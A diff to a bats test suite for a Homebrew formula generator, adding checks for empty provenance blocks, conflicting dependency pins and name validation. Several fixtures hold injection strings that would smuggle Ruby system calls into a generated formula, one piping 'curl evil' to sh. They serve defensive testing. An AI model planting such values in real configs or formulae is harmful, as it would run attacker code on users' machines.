@@ -65,10 +65,14 @@ with open(path, "w", encoding="utf-8") as handle:
 PY
 }
 
-write_config() { # $1 = require-attestation (true|false|none), $2 = key to omit
+write_config() { # $1 = require-attestation (true|false|none|empty|null), $2 = key to omit
 	CONFIG="$TEST_TEMP_DIR/winnow-binary.yml"
 	local provenance=""
-	if [[ "$1" != "none" ]]; then
+	if [[ "$1" == "empty" ]]; then
+		provenance="provenance: {}"
+	elif [[ "$1" == "null" ]]; then
+		provenance="provenance:"
+	elif [[ "$1" != "none" ]]; then
 		provenance="$(
 			cat <<YAML | grep -v "^  ${2:-__none__}:"
 provenance:
@@ -263,6 +267,33 @@ run_generate_pinme() {
 	grep -q '^      resource "idna" do' <<<"$intel_block"
 	grep -q 'idna-3.19.tar.gz' <<<"$intel_block"
 	[ "$(grep -c '^      resource "' "$OUTPUT_FILE")" -eq 2 ]
+}
+
+@test "generate-binary-formula: conflicting pins from two dependents fail closed" {
+	# pinme 0.2.0 requires idna>=3.19 and conflictor==1.0 (both macOS x86_64
+	# only); conflictor 1.0 requires idna<3.19. Whichever is walked first,
+	# the cached idna resolution cannot satisfy the other, so generation
+	# must fail naming both requirements instead of reusing the first pin.
+	write_pinme_config ""
+	cp "$REPO_ROOT/tests/fixtures/pypi/pinme-0.2.0.json" \
+		"$REPO_ROOT/tests/fixtures/pypi/conflictor.json" \
+		"$REPO_ROOT/tests/fixtures/pypi/conflictor-1.0.json" "$FIXTURES/pypi/"
+	cp "$REPO_ROOT/tests/fixtures/sdist/pinme-0.2.0.tar.gz" "$FIXTURES/sdist/"
+	OUTPUT_FILE="$TEST_TEMP_DIR/pinme.rb"
+
+	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
+		--config "$CONFIG" \
+		--formula-key pinme \
+		--version 0.2.0 \
+		--output "$OUTPUT_FILE" \
+		--binary-assets "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"Conflicting pins for idna"* ]]
+	[[ "$output" == *"idna>=3.19"* ]]
+	[[ "$output" == *"idna<3.19"* ]]
+	[[ "$output" == *"required by conflictor"* || "$output" == *"required by pinme"* ]]
+	[ ! -f "$OUTPUT_FILE" ]
 }
 
 @test "generate-binary-formula: PyPI resolution honours the sdist requires_python" {
@@ -480,6 +511,113 @@ YAML
 	[[ "$output" == *"provenance.repo is required for winnow"* ]]
 	[[ "$output" != *"skipping"* ]]
 	[ ! -f "$OUTPUT_FILE" ]
+}
+
+@test "generate-binary-formula: provenance: {} is an error, not an absent block" {
+	write_config empty
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"provenance block for winnow is present but empty"* ]]
+	[[ "$output" != *"No provenance block"* ]]
+	[ ! -f "$OUTPUT_FILE" ]
+}
+
+@test "generate-binary-formula: provenance: (null) is an error, not an absent block" {
+	write_config null
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"provenance block for winnow must be a mapping (got NoneType)"* ]]
+	[ ! -f "$OUTPUT_FILE" ]
+}
+
+@test "generate-binary-formula: extras with Ruby-significant characters are rejected" {
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      extras:
+        - 'mcp"; system "curl evil|sh'
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"intel-pypi.extras entry"*"is not a valid extra name"* ]]
+	[ ! -f "$OUTPUT_FILE" ]
+
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      extras:
+        - 'mcp#{`id`}'
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"is not a valid extra name"* ]]
+
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      extras:
+        - -leading-dash
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"is not a valid extra name"* ]]
+}
+
+@test "generate-binary-formula: homebrew-deps names and build flags are validated before rendering" {
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      homebrew-deps:
+        - 'libyaml"; system "id'
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"is not a valid Homebrew formula name"* ]]
+	[ ! -f "$OUTPUT_FILE" ]
+
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      homebrew-deps:
+        - name: Rust
+          build: true
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"'Rust' is not a valid Homebrew formula name"* ]]
+
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      homebrew-deps:
+        - name: rust
+          build: yes-please
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"build must be true or false"* ]]
+
+	write_config true
+	cat >>"$CONFIG" <<'YAML'
+      homebrew-deps:
+        - name: rust
+          optional: true
+YAML
+
+	run_generate "$(assets_json)"
+
+	[ "$status" -ne 0 ]
+	[[ "$output" == *"unknown keys ['optional']"* ]]
 }
 
 @test "generate-binary-formula: a provenance block without tag-prefix fails" {
